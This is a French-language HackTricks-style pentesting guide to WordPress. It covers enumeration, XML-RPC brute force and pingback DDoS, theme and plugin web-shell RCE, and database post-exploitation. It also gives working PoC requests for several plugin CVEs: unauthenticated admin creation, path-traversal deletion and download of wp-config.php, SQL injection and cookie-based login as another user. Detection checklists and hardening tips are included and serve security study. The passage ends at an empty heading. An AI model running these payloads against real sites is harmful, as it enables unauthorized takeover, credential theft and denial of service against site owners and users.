# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principaux fichiers WordPress**

- `index.php`
- `license.txt` contient des informations utiles telles que la version de WordPress installée.
- `wp-activate.php` est utilisé pour le processus d'activation par email lors de la création d'un nouveau site WordPress.
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` est un fichier représentant une fonctionnalité de WordPress qui permet la transmission de données en utilisant HTTP comme mécanisme de transport et XML comme mécanisme d'encodage. Ce type de communication a été remplacé par le WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Le dossier `wp-content` est le répertoire principal où les plugins et thèmes sont stockés.
- `wp-content/uploads/` est le répertoire où sont stockés tous les fichiers uploadés sur la plateforme.
- `wp-includes/` est le répertoire où les fichiers core sont stockés, tels que certificats, polices, fichiers JavaScript et widgets.
- `wp-sitemap.xml` Dans les versions de WordPress 5.5 et supérieures, WordPress génère un fichier sitemap XML contenant tous les posts publics et les types de posts et taxonomies publiquement interrogeables.

**Post exploitation**

- Le fichier `wp-config.php` contient les informations nécessaires à WordPress pour se connecter à la base de données telles que le nom de la base, l'hôte de la base, le nom d'utilisateur et le mot de passe, les clés d'authentification et salts, et le préfixe des tables de la base. Ce fichier de configuration peut également être utilisé pour activer le mode DEBUG, ce qui peut être utile pour le dépannage.

### Permissions des utilisateurs

- **Administrator**
- **Editor** : Publie et gère ses propres posts ainsi que ceux des autres
- **Author** : Publie et gère ses propres posts
- **Contributor** : Rédige et gère ses posts mais ne peut pas les publier
- **Subscriber** : Parcourt les posts et édite son profil

## **Énumération passive**

### **Obtenir la version de WordPress**

Vérifiez si vous pouvez trouver les fichiers `/license.txt` ou `/readme.html`

Dans le **code source** de la page (exemple depuis [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Fichiers CSS liés

![](<../../images/image (533).png>)

- Fichiers JavaScript

![](<../../images/image (524).png>)

### Obtenir des plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obtenir les thèmes
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraire les versions en général
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Énumération active

### Plugins and Themes

Vous ne pourrez probablement pas trouver tous les Plugins and Themes possibles. Pour tous les découvrir, vous devrez **Brute Force activement une liste de Plugins and Themes** (heureusement pour nous, il existe des outils automatisés qui contiennent ces listes).

### Utilisateurs

- **ID Brute:** Vous obtenez des utilisateurs valides d'un site WordPress en Brute Forcing les IDs des utilisateurs :
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si les réponses sont **200** ou **30X**, cela signifie que l'**id** est **valide**. Si la réponse est **400**, alors l'**id** est **invalide**.

- **wp-json:** Vous pouvez également essayer d'obtenir des informations sur les utilisateurs en interrogeant :
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un autre endpoint `/wp-json/` qui peut révéler certaines informations sur les utilisateurs est :
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Notez que cet endpoint n'expose que les utilisateurs qui ont publié un post. **Seules les informations concernant les utilisateurs pour lesquels cette fonctionnalité est activée seront fournies**.

Notez également que **/wp-json/wp/v2/pages** pourrait leak des adresses IP.

- **Login username enumeration** : Lors de la connexion via **`/wp-login.php`**, le **message** est **différent** selon qu'il indique si le **username** existe ou non.

### XML-RPC

Si `xml-rpc.php` est actif, vous pouvez effectuer un credentials brute-force ou l'utiliser pour lancer des attaques DoS vers d'autres ressources. (Vous pouvez automatiser ce processus [en utilisant ceci](https://github.com/relarizky/wpxploit) par exemple).

Pour vérifier s'il est actif, essayez d'accéder à _**/xmlrpc.php**_ et envoyez cette requête :

**Vérifier**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** sont quelques-unes des méthodes qui peuvent être utilisées pour brute-force des credentials. Si vous pouvez en trouver une, vous pouvez envoyer quelque chose comme :
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Le message _"Incorrect username or password"_ dans une réponse avec code 200 doit apparaître si les identifiants ne sont pas valides.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

En utilisant les bons identifiants vous pouvez upload a file. Dans la réponse, le chemin apparaîtra ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Il existe aussi une **méthode plus rapide** pour brute-force des credentials en utilisant **`system.multicall`**, car vous pouvez essayer plusieurs credentials dans la même requête :

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Cette méthode est destinée aux programmes et non aux humains, et elle est ancienne ; par conséquent elle ne supporte pas la 2FA. Donc, si vous avez des creds valides mais que l'accès principal est protégé par la 2FA, **vous pourriez être capable d'abuser de xmlrpc.php pour login avec ces creds en contournant la 2FA**. Notez que vous ne pourrez pas effectuer toutes les actions possibles via la console, mais vous pourrez peut-être tout de même atteindre la RCE comme l'explique Ippsec dans [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Si vous trouvez la méthode _**pingback.ping**_ dans la liste, vous pouvez faire envoyer par Wordpress une requête arbitraire vers n'importe quel hôte/port.\
On peut s'en servir pour demander à des **milliers** de **sites** Wordpress d'**accéder** à une même **cible** (ce qui provoque un **DDoS** vers cette destination), ou bien vous pouvez l'utiliser pour faire **Wordpress** **scanner** un **réseau** interne (vous pouvez indiquer n'importe quel port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si vous obtenez **faultCode** avec une valeur **supérieure** à **0** (17), cela signifie que le port est ouvert.

Regardez l'utilisation de **`system.multicall`** dans la section précédente pour apprendre comment abuser de cette méthode afin de provoquer un DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ce fichier existe généralement à la racine du site Wordpress : **`/wp-cron.php`**\
Lorsque ce fichier est **accédé**, une **heavy** MySQL **query** est exécutée, il peut donc être utilisé par des **attackers** pour **causer** un **DoS**.\
De plus, par défaut, le `wp-cron.php` est appelé à chaque chargement de page (chaque fois qu'un client demande une page Wordpress), ce qui sur des sites à fort trafic peut provoquer des problèmes (DoS).

Il est recommandé de désactiver Wp-Cron et de créer un vrai cronjob sur l'hôte qui effectue les actions nécessaires à intervalles réguliers (sans causer de problèmes).

### /wp-json/oembed/1.0/proxy - SSRF

Essayez d'accéder à _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ et le site Worpress peut effectuer une requête vers vous.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Cet outil vérifie si **methodName: pingback.ping** et le chemin **/wp-json/oembed/1.0/proxy** sont présents, et s'ils existent, il tente de les exploiter.

## Outils automatiques
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtenir l'accès en modifiant un bit

Plus qu'une véritable attaque, c'est une curiosité. Dans le CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) vous pouviez inverser 1 bit de n'importe quel fichier wordpress. Ainsi, vous pouviez inverser le bit à la position `5389` du fichier `/var/www/html/wp-includes/user.php` pour transformer l'opération NOT (`!`) en NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panneau RCE**

**Modifier un fichier php du thème utilisé (identifiants admin requis)**

Apparence → Éditeur de thème → Modèle 404 (à droite)

Remplacez le contenu par un php shell:

![](<../../images/image (384).png>)

Cherchez sur internet comment accéder à cette page mise à jour. Dans ce cas, vous devez accéder ici: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Vous pouvez utiliser :
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
pour obtenir une session.

## Plugin RCE

### PHP plugin

Il peut être possible d'uploader des fichiers .php en tant que plugin.\
Créez votre backdoor php en utilisant par exemple :

![](<../../images/image (183).png>)

Puis ajoutez un nouveau plugin :

![](<../../images/image (722).png>)

Upload plugin et cliquez sur Install Now :

![](<../../images/image (249).png>)

Cliquez sur Procced :

![](<../../images/image (70).png>)

Probablement cela ne fera apparemment rien, mais si vous allez dans Media, vous verrez votre shell uploadé :

![](<../../images/image (462).png>)

Accédez-y et vous verrez l'URL pour exécuter le reverse shell :

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Cette méthode implique l'installation d'un plugin malveillant connu pour être vulnérable et pouvant être exploité pour obtenir un web shell. Ce processus est réalisé via le dashboard WordPress comme suit :

1. **Plugin Acquisition** : Le plugin est obtenu depuis une source comme Exploit DB comme [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation** :
- Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation** : Une fois le plugin installé avec succès, il doit être activé via le dashboard.
4. **Exploitation** :
- With the plugin "reflex-gallery" installed and activated, it can be exploited as it is known to be vulnerable.
- The Metasploit framework provides an exploit for this vulnerability. By loading the appropriate module and executing specific commands, a meterpreter session can be established, granting unauthorized access to the site.
- It's noted that this is just one of the many methods to exploit a WordPress site.

Le contenu inclut des aides visuelles montrant les étapes dans le dashboard WordPress pour l'installation et l'activation du plugin. Cependant, il est important de noter que l'exploitation de vulnérabilités de cette manière est illégale et contraire à l'éthique sans autorisation appropriée. Ces informations doivent être utilisées de manière responsable et uniquement dans un contexte légal, comme le pentesting avec une permission explicite.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS à RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ est un script conçu pour escalader une vulnérabilité **Cross-Site Scripting (XSS)** vers **Remote Code Execution (RCE)** ou d'autres vulnérabilités critiques dans WordPress. Pour plus d'infos, consultez [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Il fournit **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Crée un utilisateur dans WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload votre plugin personnalisé (backdoor) vers WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Édite un Built-In Plugin dans WordPress.
- _**(RCE) Built-In Theme Edit:**_ Édite un Built-In Theme dans WordPress.
- _**(Custom) Custom Exploits:**_ Exploits personnalisés pour des plugins/themes tiers WordPress.

## Post Exploitation

Extraire les noms d'utilisateur et les mots de passe :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Changer le mot de passe admin :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Surface d'attaque

Comprendre comment un plugin Wordpress peut exposer des fonctionnalités est essentiel pour trouver des vulnérabilités. Vous trouverez comment un plugin peut exposer des fonctionnalités dans les points suivants, ainsi que des exemples de plugins vulnérables dans [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Une des façons dont un plugin peut exposer des fonctions aux utilisateurs est via des AJAX handlers. Ceux-ci peuvent contenir des bugs de logique, d'autorisation ou d'authentification. De plus, il est assez fréquent que ces fonctions basent à la fois l'authentification et l'autorisation sur l'existence d'un wordpress nonce que **tout utilisateur authentifié dans l'instance Wordpress peut posséder** (indépendamment de son rôle).

Voici les fonctions qui peuvent être utilisées pour exposer une fonction dans un plugin :
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'utilisation de `nopriv` rend l'endpoint accessible par tous les utilisateurs (même non authentifiés).**

> [!CAUTION]
> De plus, si la fonction ne vérifie l'autorisation de l'utilisateur qu'avec la fonction `wp_verify_nonce`, cette fonction ne fait que vérifier que l'utilisateur est connecté, elle ne vérifie généralement pas le rôle de l'utilisateur. Ainsi, des utilisateurs à faible privilèges peuvent avoir accès à des actions à privilèges élevés.

- **REST API**

Il est également possible d'exposer des fonctions de WordPress en enregistrant une REST API avec la fonction `register_rest_route` :
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Le `permission_callback` est une fonction de rappel qui vérifie si un utilisateur donné est autorisé à appeler la méthode API.

**Si la fonction intégrée `__return_true` est utilisée, elle contournera simplement la vérification des permissions utilisateur.**

- **Accès direct au fichier php**

Bien sûr, Wordpress utilise PHP et les fichiers à l'intérieur des plugins sont directement accessibles depuis le web. Donc, si un plugin expose une fonctionnalité vulnérable déclenchée simplement en accédant au fichier, elle pourra être exploitée par n'importe quel utilisateur.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Certains plugins implémentent des raccourcis de « trusted header » pour des intégrations internes ou des reverse proxies, puis utilisent cet en-tête pour définir le contexte utilisateur courant des requêtes REST. Si l'en-tête n'est pas lié cryptographiquement à la requête par un composant en amont, un attaquant peut le falsifier et atteindre des routes REST privilégiées en tant qu'administrateur.

- Impact : élévation de privilèges non authentifiée vers admin en créant un nouvel administrateur via la core users REST route.
- En-tête d'exemple : `X-Wcpay-Platform-Checkout-User: 1` (force l'ID utilisateur 1, typiquement le premier compte administrateur).
- Route exploitée : `POST /wp-json/wp/v2/users` avec un tableau de rôle élevé.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Pourquoi ça fonctionne

- Le plugin mappe un header contrôlé par le client à l'état d'authentification et saute les vérifications de capacités.
- WordPress core attend la capacité `create_users` pour cette route ; le hack du plugin la contourne en définissant directement le contexte de l'utilisateur courant depuis le header.

Indicateurs de succès attendus

- HTTP 201 avec un corps JSON décrivant l'utilisateur créé.
- Un nouvel utilisateur admin visible dans `wp-admin/users.php`.

Checklist de détection

- Grep pour `getallheaders()`, `$_SERVER['HTTP_...']`, ou des vendor SDKs qui lisent des headers personnalisés pour définir le contexte utilisateur (par ex. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revoir les enregistrements REST pour des callbacks privilégiés qui n'ont pas de vérifications robustes de `permission_callback` et se reposent plutôt sur les headers de la requête.
- Chercher des usages des fonctions core de gestion des utilisateurs (`wp_insert_user`, `wp_create_user`) à l'intérieur des handlers REST qui ne sont filtrés que par des valeurs de header.

### Suppression arbitraire de fichiers sans authentification via wp_ajax_nopriv (Litho Theme <= 3.0)

Les thèmes et plugins WordPress exposent fréquemment des handlers AJAX via les hooks `wp_ajax_` et `wp_ajax_nopriv_`. Lorsque la variante **_nopriv_** est utilisée **le callback devient accessible aux visiteurs non authentifiés**, donc toute action sensible doit en plus implémenter :

1. Une **vérification des capacités** (par ex. `current_user_can()` ou au moins `is_user_logged_in()`), et
2. Un **nonce CSRF** validé avec `check_ajax_referer()` / `wp_verify_nonce()`, et
3. **Assainissement / validation stricte des entrées**.

Le thème multipurpose Litho (< 3.1) a oublié ces 3 contrôles dans la fonctionnalité *Remove Font Family* et a fini par livrer le code suivant (simplifié) :
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problèmes introduits par cet extrait :

* **Accès non authentifié** – le `wp_ajax_nopriv_` hook est enregistré.
* **Pas de nonce / capability check** – n'importe quel visiteur peut atteindre l'endpoint.
* **Pas de path sanitisation** – la chaîne contrôlée par l'utilisateur `fontfamily` est concaténée à un chemin filesystem sans filtrage, permettant le classique `../../` traversal.

#### Exploitation

Un attaquant peut supprimer n'importe quel fichier ou répertoire **sous le répertoire de base des uploads** (normalement `<wp-root>/wp-content/uploads/`) en envoyant une seule requête HTTP POST :
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Parce que `wp-config.php` se trouve en dehors de *uploads*, quatre séquences `../` suffisent sur une installation par défaut. Supprimer `wp-config.php` force WordPress à lancer l'*installation wizard* lors de la visite suivante, permettant une prise de contrôle complète du site (l'attaquant fournit simplement une nouvelle configuration DB et crée un utilisateur admin).

D'autres cibles impactantes incluent les fichiers plugin/theme `.php` (pour neutraliser des plugins de sécurité) ou les règles `.htaccess`.

#### Checklist de détection

* Tout callback `add_action( 'wp_ajax_nopriv_...')` qui appelle des helpers du système de fichiers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation d'entrées utilisateur non assainies dans des chemins (recherchez `$_POST`, `$_GET`, `$_REQUEST`).
* Absence de `check_ajax_referer()` et de `current_user_can()`/`is_user_logged_in()`.

---

### Élévation de privilèges via une restauration de rôle obsolète et absence d'autorisation (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

Un exemple réel a été trouvé dans le Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). La branche de reset restaurait les rôles basés sur `reset-for=<username>` si le nom d'utilisateur apparaissait dans un tableau interne `$options['viewing_admin_as_role_are']`, mais n'exécutait ni vérification `current_user_can()` ni vérification de nonce avant de supprimer les rôles actuels et de réajouter les rôles sauvegardés depuis le user meta `_asenha_view_admin_as_original_roles` :
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Pourquoi c’est exploitable

- Fait confiance à `$_REQUEST['reset-for']` et à une option du plugin sans autorisation côté serveur.
- Si un utilisateur avait précédemment des privilèges plus élevés enregistrés dans `_asenha_view_admin_as_original_roles` et a été rétrogradé, il peut les restaurer en appelant le chemin de reset.
- Dans certains déploiements, tout utilisateur authentifié pouvait déclencher un reset pour un autre nom d’utilisateur toujours présent dans `viewing_admin_as_role_are` (autorisation défaillante).

Exploitation (exemple)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Sur les versions vulnérables, cela supprime les rôles actuels et restaure les rôles originaux sauvegardés (par ex., `administrator`), ce qui entraîne une élévation de privilèges.

Detection checklist

- Recherchez des fonctionnalités de commutation de rôle qui conservent les rôles originaux dans le user meta (par ex., `_asenha_view_admin_as_original_roles`).
- Identifiez les chemins de réinitialisation/restauration qui :
- Lire les noms d'utilisateur depuis `$_REQUEST` / `$_GET` / `$_POST`.
- Modifier les rôles via `add_role()` / `remove_role()` sans `current_user_can()` ni `wp_verify_nonce()` / `check_admin_referer()`.
- Autoriser sur la base d'un tableau d'options du plugin (par ex., `viewing_admin_as_role_are`) au lieu des capacités de l'acteur.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Certains plugins raccordent des helpers de changement d'utilisateur au hook public `init` et déterminent l'identité à partir d'un cookie contrôlé par le client. Si le code appelle `wp_set_auth_cookie()` sans vérifier l'authentification, les capacités et un nonce valide, tout visiteur non authentifié peut forcer la connexion en tant qu'ID utilisateur arbitraire.

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Pourquoi c'est exploitable

- Le hook public `init` rend le handler accessible aux utilisateurs non authentifiés (pas de garde `is_user_logged_in()`).
- L'identité est dérivée d'un cookie modifiable par le client (`original_user_id`).
- Un appel direct à `wp_set_auth_cookie($uid)` connecte le requérant en tant que cet utilisateur sans aucune vérification de capability/nonce.

Exploitation (non authentifiée)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Considérations WAF pour WordPress/plugin CVEs

Les WAFs génériques en edge/serveur sont réglés pour des motifs larges (SQLi, XSS, LFI). Beaucoup de failles WordPress/plugin à fort impact sont des problèmes de logique/auth spécifiques à l'application qui ressemblent à du trafic bénin à moins que le moteur ne comprenne les routes WordPress et la sémantique des plugins.

Offensive notes

- Ciblez les endpoints spécifiques aux plugins avec des payloads propres : `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Testez d'abord les chemins non authentifiés (AJAX `nopriv`, REST avec permissive `permission_callback`, shortcodes publics). Les payloads par défaut réussissent souvent sans obfuscation.
- Cas typiques à fort impact : privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Ne comptez pas sur des signatures WAF génériques pour protéger les CVEs de plugin. Implémentez des virtual patches spécifiques à la vulnérabilité au niveau applicatif ou mettez à jour rapidement.
- Privilégiez les contrôles à sécurité positive dans le code (capabilities, nonces, strict input validation) plutôt que les filtres négatifs basés sur des regex.

## WordPress Protection

### Regular Updates

Assurez-vous que WordPress, plugins, et themes sont à jour. Vérifiez également que la mise à jour automatique est activée dans wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
De plus, n'installez que des plugins et thèmes WordPress fiables.

### Plugins de sécurité

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Autres recommandations**

- Supprimez l'utilisateur par défaut **admin**
- Utilisez des **mots de passe forts** et **2FA**
- Passez périodiquement en revue les **permissions** des utilisateurs
- **Limit login attempts** pour prévenir les attaques Brute Force
- Renommez le fichier **`wp-admin.php`** et n'autorisez l'accès que depuis le réseau interne ou depuis certaines adresses IP.


### SQL Injection non authentifiée due à une validation insuffisante (WP Job Portal <= 2.3.2)

Le plugin de recrutement WP Job Portal exposait une tâche **savecategory** qui exécute finalement le code vulnérable suivant dans `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problèmes introduits par cet extrait :

1. **Entrée utilisateur non assainie** – `parentid` provient directement de la requête HTTP.
2. **Concaténation de chaînes dans la clause WHERE** – pas d'utilisation de `is_numeric()` / `esc_sql()` / de requêtes préparées.
3. **Accessibilité sans authentification** – bien que l'action soit exécutée via `admin-post.php`, la seule vérification en place est un **CSRF nonce** (`wp_verify_nonce()`), que n'importe quel visiteur peut récupérer depuis une page publique incorporant le shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. Récupérer un nonce récent :
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injecter du SQL arbitraire en abusant de `parentid` :
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La réponse divulgue le résultat de la requête injectée ou modifie la base de données, prouvant une SQLi.


### Téléchargement arbitraire de fichiers sans authentification / Path Traversal (WP Job Portal <= 2.3.2)

Une autre tâche, **downloadcustomfile**, permettait aux visiteurs de télécharger **n'importe quel fichier sur le disque** via un path traversal. La sink vulnérable se trouve dans `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est contrôlé par l'attaquant et concaténé **sans sanitisation**. Encore une fois, la seule barrière est un **CSRF nonce** qui peut être récupéré depuis la page du CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Le serveur renvoie le contenu de `wp-config.php`, leaking DB credentials and auth keys.

## Prise de contrôle de compte sans authentification via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

